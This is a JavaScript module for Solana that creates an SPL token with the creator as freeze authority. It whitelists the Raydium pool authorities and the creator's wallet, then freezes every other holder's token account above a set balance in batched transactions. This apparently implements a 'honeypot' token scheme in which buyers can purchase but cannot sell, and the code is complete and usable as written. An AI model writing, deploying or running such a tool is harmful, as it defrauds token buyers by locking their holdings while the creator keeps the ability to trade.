import bs58 from 'bs58';
import {
    Keypair,
    Connection,
    PublicKey,
    sendAndConfirmTransaction,
    Transaction,
    ComputeBudgetProgram,
    LAMPORTS_PER_SOL
} from "@solana/web3.js";
import {
    TOKEN_PROGRAM_ID,
    createMint,
    getAssociatedTokenAddress,
    createAssociatedTokenAccount,
    mintTo,
    createSetAuthorityInstruction,
    AuthorityType
} from "@solana/spl-token";
import { TransactionInstruction } from "@solana/web3.js";
import { AccountLayout } from "@solana/spl-token";

// Hardcoded techConfig for browser environment, as fs is not available
const techConfig = {
    chunkSize: 5, // Example value, adjust as needed
    requestTick: 1000, // Example value
    tick: 500, // Example value
    showControls: false // No console controls in a web UI
};

let raydiumAuthority = [
    "5Q544fKrFoe6tsEbD7S8EmxGTJYAKtTVhAW5Q5pge4j1", // Raydium Authority V4
    "GpMZbSM2GgvTKHJirzeGfMFoaZ8UR2X7F4v8vHTxvbL" // Raydium Vault Authority #2
];

// Helper function for sleep
const sleep = async (ms) => new Promise((resolve) => setTimeout(resolve, ms));

/**
 * Initializes the Solana connection and keypair from the provided configuration.
 * @param {object} config - The configuration object containing rpcEndpoint and privateKey.
 * @returns {object} An object containing the connection and keypair.
 */
export const initializeSolana = async (config) => {
    const connection = new Connection(config.rpcEndpoint, "confirmed");
    let keypair;
    try {
        const bs = bs58.decode(config.privateKey);
        keypair = Keypair.fromSecretKey(bs);
    } catch (error) {
        throw new Error(`Invalid data at "privateKey" field: ${error.message}`);
    }
    return { connection, keypair };
};

/**
 * Creates a new SPL token.
 * @param {Connection} connection - The Solana connection object.
 * @param {Keypair} payer - The keypair of the account paying for the transaction and becoming the mint authority.
 * @param {number} decimals - The number of decimals for the new token.
 * @param {number} supply - The total supply of the new token.
 * @param {PublicKey} freezeAuthority - The public key of the freeze authority.
 * @returns {PublicKey} The public key of the newly created mint.
 */
export const createNewToken = async (connection, payer, decimals, supply, freezeAuthority) => {
    const mint = await createMint(
        connection,
        payer,
        payer.publicKey, // Mint authority
        freezeAuthority, // Freeze authority
        decimals,
        TOKEN_PROGRAM_ID
    );

    console.log(`New token created: ${mint.toBase58()}`);

    // Create associated token account for the payer
    const associatedTokenAccount = await getAssociatedTokenAddress(
        mint,
        payer.publicKey
    );

    await createAssociatedTokenAccount(
        connection,
        payer,
        mint,
        payer.publicKey
    );

    // Mint initial supply to the associated token account
    await mintTo(
        connection,
        payer,
        mint,
        associatedTokenAccount,
        payer.publicKey, // Mint authority
        supply * (10 ** decimals)
    );

    console.log(`Minted ${supply} tokens to ${payer.publicKey.toBase58()}`);

    return mint;
};

/**
 * Revokes the mint authority of a token.
 * @param {Connection} connection - The Solana connection object.
 * @param {Keypair} currentAuthority - The current mint authority keypair.
 * @param {PublicKey} mintAddress - The public key of the mint.
 * @returns {string} The transaction signature.
 */
export const revokeMintAuthority = async (connection, currentAuthority, mintAddress) => {
    const transaction = new Transaction().add(
        createSetAuthorityInstruction(
            mintAddress,
            currentAuthority.publicKey,
            AuthorityType.MintTokens,
            null // Set new authority to null to revoke
        )
    );

    const signature = await sendAndConfirmTransaction(connection, transaction, [currentAuthority]);
    console.log(`Mint authority revoked for ${mintAddress.toBase58()}. Signature: ${signature}`);
    return signature;
};

/**
 * Processes the whitelist by adding Raydium authorities and the keypair's public key.
 * @param {PublicKey} keypairPublicKey - The public key of the connected wallet.
 * @param {string[]} currentWhitelist - The current whitelist array.
 * @returns {string[]} The updated whitelist.
 */
export const processWhitelist = (keypairPublicKey, currentWhitelist) => {
    let updatedWhitelist = [...currentWhitelist];
    raydiumAuthority.forEach(authority => {
        if (!updatedWhitelist.includes(authority)) {
            updatedWhitelist.push(authority);
        }
    });
    if (!updatedWhitelist.includes(keypairPublicKey.toBase58())) {
        updatedWhitelist.push(keypairPublicKey.toBase58());
    }
    return updatedWhitelist;
};

/**
 * Fetches token account data and identifies accounts to freeze.
 * @param {Connection} connection - The Solana connection object.
 * @param {object} config - The configuration object.
 * @param {PublicKey} mintAddressPublicKey - The public key of the mint address.
 * @param {number} decimals - The number of decimals for the token.
 * @param {string[]} whitelist - The list of whitelisted addresses.
 * @returns {object} An object containing the token accounts to freeze and the quoteTokenVault.
 */
export const getHoldersData = async (connection, config, mintAddressPublicKey, decimals, whitelist) => {
    let tokenAccountsToFreeze = new Set();
    let quoteTokenVault = null;
    let poolType = "Unknown";

    const accounts = await connection.getProgramAccounts(
        TOKEN_PROGRAM_ID,
        {
            commitment: "confirmed",
            filters: [
                { dataSize: 165 },
                { memcmp: { offset: 0, bytes: mintAddressPublicKey.toBase58() } }
            ]
        }
    );

    for (const { pubkey, account } of accounts) {
        try {
            const data = AccountLayout.decode(account.data);
            const mint = new PublicKey(data.mint);
            const owner = new PublicKey(data.owner).toBase58();
            const amount = Number(data.amount);
            const state = data.state;

            if (!quoteTokenVault) {
                for (let i = 0; i < raydiumAuthority.length; i++) {
                    if (owner === raydiumAuthority[i]) {
                        quoteTokenVault = new PublicKey(pubkey);
                        poolType = i === 0 ? "Legacy AMM (V2)" : "Standard AMM (V3)";
                    }
                }
            }

            if (
                state === 1 &&
                mint.equals(mintAddressPublicKey) &&
                !whitelist.includes(owner) &&
                amount >= config.freezeThreshold * (10 ** decimals)
            ) {
                tokenAccountsToFreeze.add(pubkey.toBase58());
            }
        } catch (innerError) {
            console.warn(`⚠️ Skipping invalid token account: ${pubkey.toBase58()} (${innerError.message})`);
            continue;
        }
    }
    return { tokenAccountsToFreeze: Array.from(tokenAccountsToFreeze), quoteTokenVault, poolType };
};

/**
 * Freezes token holders based on the provided configuration.
 * @param {Connection} connection - The Solana connection object.
 * @param {object} config - The configuration object.
 * @param {Keypair} keypair - The keypair of the freeze authority.
 * @param {PublicKey} mintAddressPublicKey - The public key of the mint address.
 * @param {number} decimals - The number of decimals for the token.
 * @param {string[]} whitelist - The list of whitelisted addresses.
 * @returns {string[]} An array of transaction signatures.
 */
export const freezeHolders = async (connection, config, keypair, mintAddressPublicKey, decimals, whitelist) => {
    const { tokenAccountsToFreeze } = await getHoldersData(connection, config, mintAddressPublicKey, decimals, whitelist);
    const PRIORITY_RATE = config.priorityRate;
    const CHUNK_SIZE = techConfig.chunkSize;
    let signatures = [];

    if (tokenAccountsToFreeze.length === 0) {
        console.log("No accounts to freeze found.");
        return [];
    }

    for (let i = 0; i < tokenAccountsToFreeze.length; i += CHUNK_SIZE) {
        const chunk = tokenAccountsToFreeze.slice(i, i + CHUNK_SIZE);
        let transactions = new Transaction();

        for (let j = 0; j < chunk.length; j++) {
            let tokenAccountPublicKey = new PublicKey(chunk[j]);
            const instruction = new TransactionInstruction({
                keys: [
                    { pubkey: tokenAccountPublicKey, isSigner: false, isWritable: true },
                    { pubkey: mintAddressPublicKey, isSigner: false, isWritable: false },
                    { pubkey: keypair.publicKey, isSigner: true, isWritable: false },
                ],
                programId: TOKEN_PROGRAM_ID,
                data: Buffer.from([10]) // Freeze account instruction
            });
            transactions.add(instruction);
        }

        if (PRIORITY_RATE > 0) {
            const priorityFeeInstruction = ComputeBudgetProgram.setComputeUnitPrice({ microLamports: PRIORITY_RATE });
            transactions.add(priorityFeeInstruction);
        }

        try {
            const signature = await sendAndConfirmTransaction(
                connection,
                transactions,
                [keypair]
            );
            signatures.push(signature);
            console.log(`Frozen ${chunk.length} accounts. Signature: ${signature}`);
        } catch (error) {
            console.error(`Error freezing chunk: ${error.message}`);
            throw error;
        }
    }
    return signatures;
};

/**
 * Fetches token metadata (supply, decimals, freeze authority).
 * @param {Connection} connection - The Solana connection object.
 * @param {PublicKey} mintAddressPublicKey - The public key of the mint address.
 * @returns {object} An object containing mintData (supply, decimals, freezeAuthority).
 */
export const getTokenMetadata = async (connection, mintAddressPublicKey) => {
    let mintDataJSON = await connection.getParsedAccountInfo(mintAddressPublicKey);
    if (mintDataJSON.value === null) {
        throw new Error(`Invalid mintAddress: Account not found.`);
    }
    const mintData = mintDataJSON.value.data.parsed;
    if (!mintData || mintData.type !== "mint") {
        throw new Error(`Provided address is not a token mint.`);
    }
    return {
        supply: mintData.info.supply,
        decimals: mintData.info.decimals,
        freezeAuthority: mintData.info.freezeAuthority
    };
};

// The main loop from freeze.js is not directly transferable to a web UI in the same way.
// The web UI will trigger freezeHolders manually or based on user interaction.
// The listenerId and updateCounter logic would need to be re-implemented using web sockets
// or polling if real-time updates are desired, but for now, manual triggering is assumed.
